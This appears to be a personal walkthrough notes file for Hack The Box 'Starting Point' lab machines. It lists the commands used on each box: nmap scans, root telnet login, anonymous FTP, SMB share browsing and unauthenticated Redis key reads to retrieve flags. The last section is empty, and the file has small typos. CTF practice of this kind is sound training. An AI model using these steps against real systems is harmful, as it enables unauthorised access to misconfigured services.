# starting point machines

## Meow

```shell
sudo namp -sN -A <ip_address> -v
telnet <ip_address>
username: root
cat flag.txt
```

## Fawn

```shell
sudo nmap -sN -A <ip_address> -v
ftp <ip_address>
username: anonymous
get flag.txt
exit
cat flag.txt
```

## Dancing

```shell
sudo nmap -sN -A <ip_address> -v
sudo nmap -A <ip_address> -
smbclient -L <ip_address>
smbclient //<ip_address>/WorkShares
cd James.P
get flag.txt
```

## Redeemer

```shell
sudo nmap -A -p1-9000 <ip_address>
sudo apt-get install redis -y
redis-cli -h 10.129.107.1
info
select 0
keys *
get flag
```

## Appointment

```shell

```